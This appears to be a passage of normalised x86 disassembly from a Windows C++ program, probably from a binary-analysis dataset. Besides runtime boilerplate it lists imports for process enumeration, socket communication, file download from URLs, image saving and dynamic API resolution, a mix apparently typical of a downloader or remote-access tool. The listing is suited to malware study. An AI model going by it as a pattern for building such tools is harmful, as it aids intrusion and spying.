call sub_41241a
pop ecx
retn
sub_40f8c8
mov ecx rw-data
jmp sub_4020a3
sub_40f8d2
call sub_40f8dc
jmp sub_40f8f1
sub_40f8dc
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
sub_40f8f1
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40f8fd
call sub_41241a
pop ecx
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40f8fd
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_410462
push ebp
mov ebp esp
call sub_409357
mov ecx [ ebp + 0x8 ]
shl ecx 0x4
add eax ecx
pop ebp
retn 0x4
j_sub_41047b
jmp sub_41047b
sub_41047b
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_4109c6
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x8
push eax
call [ rw-data ]
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x4 ]
leave
retn
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_411d5e
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
call sub_411d79
push eax
mov ecx esi
call sub_411d7d
pop esi
pop ebp
retn 0x4
sub_411d79
mov eax [ ecx + 0x8 ]
retn
sub_411fb6
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_411fcb
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_411fcb
push ??1Init@ios_base@std@@QAE@XZ
call sub_41241a
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_411fe2
call ??0_Winit@std@@QAE@XZ
jmp sub_411ff7
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_411ff7
push ??1_Winit@std@@QAE@XZ
call sub_41241a
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
j_sub_412013
jmp sub_412013
sub_412013
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
Process32NextW
jmp [ Process32NextW@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
??0logic_error@std@@QAE@ABV01@@Z
jmp [ std::logic_error::logic_error@IAT ]
??0out_of_range@std@@QAE@ABV01@@Z
jmp [ std::out_of_range::out_of_range@IAT ]
??1out_of_range@std@@UAE@XZ
jmp [ std::out_of_range::~out_of_range@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
jmp [ std::operator&@IAT ]
sub_412390
push [ esp + 0x4 ]
call free
pop ecx
retn
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
jmp [ std::operator&@IAT ]
??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
jmp [ std::operator&@IAT ]
??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
jmp [ std::operator<<@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@DABV10@@Z
jmp [ std::operator&@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??0exception@@QAE@ABV0@@Z
jmp [ exception::exception@IAT ]
sub_4123cc
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412390
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
sub_4123ee
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_41241a
push [ esp + 0x4 ]
call sub_4123ee
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_ftol
jmp [ _ftol@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
free
jmp [ free@IAT ]
sub_4125d1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4125f6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_412608
xor eax eax
retn
_controlfp
jmp [ _controlfp@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
connect
jmp [ connect@IAT ]
recv
jmp [ recv@IAT ]
send
jmp [ send@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
htons
jmp [ htons@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
URLDownloadToFileW
jmp [ URLDownloadToFileW@IAT ]
URLOpenBlockingStreamW
jmp [ URLOpenBlockingStreamW@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GdipLoadImageFromStream
jmp [ GdipLoadImageFromStream@IAT ]
GdipLoadImageFromStreamICM
jmp [ GdipLoadImageFromStreamICM@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipSaveImageToFile
jmp [ GdipSaveImageToFile@IAT ]
sub_4126ac
mov eax r--data
jmp __CxxFrameHandler
sub_4126b8
mov eax r--data
jmp __CxxFrameHandler
sub_4126c4
mov eax r--data
jmp __CxxFrameHandler
sub_4126d0
mov eax r--data
jmp __CxxFrameHandler
sub_4126dc
mov eax r--data
jmp __CxxFrameHandler
